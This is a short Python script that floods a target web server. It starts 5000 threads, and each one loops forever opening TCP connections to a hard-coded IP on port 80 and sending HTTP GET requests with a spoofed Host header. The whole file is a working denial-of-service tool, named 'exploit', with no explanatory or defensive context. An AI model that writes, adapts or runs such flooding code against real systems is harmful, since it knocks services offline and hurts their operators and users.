import threading
import socket

target = '192.168.0.1'
port = 80
fakeIP = '198.47.20.11'
connectionCounter = 0

def exploit():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global connectionCounter 
        connectionCounter += 1
        #if connectionCounter % 500 == 0:
        print(connectionCounter)

def main():
    for i in range(5000):
        thread = threading.Thread(target=exploit)
        thread.start()

if __name__ == '__main__':
    main()
